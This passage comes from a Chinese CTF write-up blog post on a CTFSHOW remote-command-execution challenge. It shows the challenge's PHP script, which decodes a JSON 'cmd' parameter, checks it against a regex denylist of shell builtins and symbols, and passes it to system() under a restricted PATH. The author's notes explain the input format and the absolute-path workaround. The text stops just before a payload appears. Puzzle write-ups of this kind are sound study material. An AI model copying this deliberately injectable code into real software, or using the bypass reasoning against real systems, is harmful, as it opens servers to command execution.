<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">putenv</span>(<span class="string">&#x27;PATH=/home/rceservice/jail&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$json</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!<span class="title function_ invoke__">is_string</span>(<span class="variable">$json</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/&#x27;</span>, <span class="variable">$json</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Attempting to run command:&lt;br/&gt;&#x27;</span>;</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$json</span>, <span class="literal">true</span>)[<span class="string">&#x27;cmd&#x27;</span>];<span class="comment">//$cmd是json解码后键名为cmd的那个</span></span><br><span class="line">                                 <span class="comment">//json_decode返还的是一个数组</span></span><br><span class="line">                                  <span class="comment">//所以输入的格式为?cmd=&#123;&quot;cmd&quot;:&quot;指令&quot;&#125;</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$cmd</span> !== <span class="literal">NULL</span>) &#123;</span><br><span class="line">      <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;Invalid input&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>看的出来ban了很多很多东西，代码审计后发现要我们以json格式输入cmd，并且放入system去执行，那么这个system肯定就是关键了咯，还有这段代码<strong>putenv(‘PATH&#x3D;&#x2F;home&#x2F;rceservice&#x2F;jail’);</strong></p>
<p>这段代码配置了环境变量，在PATH&#x3D;&#x2F;home&#x2F;rceservice&#x2F;jail下，这就是为什么没ban掉cat却不可以用cat的原因，<strong>因为Linux命令的位置：&#x2F;bin,&#x2F;usr&#x2F;bin，默认都是全体用户使用，&#x2F;sbin,&#x2F;usr&#x2F;sbin,默认root用户使用</strong>，所以想要用cat得用&#x2F;bin&#x2F;cat这种格式</p>
<p>我们来进行尝试输入：?cmd&#x3D;</p>

    </div>

    
    <div class="about">
        <h1>About this Post</h1>
        <div class="details">
            <p>This post is written by Boogipop, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
        </div>
        
        <p class="tags">
            
            <i class="icon"></i>
            <a href="/tags/CTF/" class="tag">#CTF</a><a href="/tags/刷题记录/" class="tag">#刷题记录</a><a href="/tags/CTFSHOW/" class="tag">#CTFSHOW</a>
        </p>
        
    </div>
    

    <div class="container post-prev-next">
        
        <a href="/2023/03/02/CTFSHOW-SQL%E6%B3%A8%E5%85%A5/" class="next">
            <div>
                <div class="text">
                    <p class="label">Next</p>
                    <h3 class="title">CTFSHOW-SQL注入</h3>
                </div>
            </div>
        </a>
        
        
        <a href="/2023/03/02/CTFSHOW-Node.Js/" class="prev">
            <div>
                <div class="text">
                    <p class="label">Previous</p>
                    <h3 class="title">CTFSHOW-NodeJS</>
                </div>
            </div>
        </a>
        
    </div>

    
        
        
        <script src="https://giscus.app/client.js" data-repo="Boogipop/Boogipop.github.io" data-repo-id="R_kgDOIFi78g" data-category="Announcements" data-category-id="DIC_kwDOIFi78s4Cav9f" data-mapping="pathname" data-strict="1" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async></script>
        
    
</article>

        <footer>
    <div class="inner">
        <div class="links">
            
            <div class="group">
                <h2 class="title">Blog</h2>
                
                <a href="/" class="item">Blog</a>
                
                <a href="/archives" class="item">Archives</a>
                
                <a href="/tags" class="item">Tags</a>
                
                <a href="/categories" class="item">Categories</a>
                
                <a href="/search" class="item">Search</a>
                
                <a href="/friends" class="item">Friends</a>
                
                <a href="/about" class="item">About</a>
                
                <a href="/atom.xml" class="item">RSS</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Projects</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/rsa-cli" class="item">RSA CLI</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/hexo-theme-cupertino" class="item">Hexo Theme Cupertino</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/a-calendar" class="item">A Calendar</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/auto-mirroring-bucket" class="item">Auto Mirroring Bucket</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Me</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom" class="item">GitHub</a>
                
                <a target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" class="item">CodePen</a>
                
                <a target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" class="item">Patreon</a>
                
                <a target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" class="item">Mastodon</a>
                
                <a target="_blank" rel="noopener" href="https://discord.gg/UKuFDjcfY8" class="item">Discord</a>
                
                <a href="mailto:mr.will.com@outlook.com" class="item">Email</a>
                
            </div>
            
        </div>
        <span>&copy; 2025 Boogipop<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> </span>
        
        
            <br>
            <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
                <label>
                    <input type="radio" value="light">
                    <span>Light</span>
                </label>
                <label>
                    <input type="radio" value="dark">
                    <span>Dark</span>
                </label>
                <label>
                    <input type="radio" value="auto">
                    <span>Auto</span>
                </label>
            </div>
        
    </div>
</footer>


        
<script src="/js/main.js"></script>

        
        
        

        
        <script src="https://unpkg.com/scrollreveal"></script>
		
        <script>
            window.addEventListener('load', () => {
                ScrollReveal({ delay: 250, reset: true, easing: 'cubic-bezier(0, 0, 0, 1)' })
                ScrollReveal().reveal('.post-list-item .cover-img img')
                ScrollReveal().reveal('.post-list-item, .card, .content p img, .content .block-large img', { distance: '60px', origin: 'bottom', duration: 800 })
            })
        </script>
        
    </body>
</html>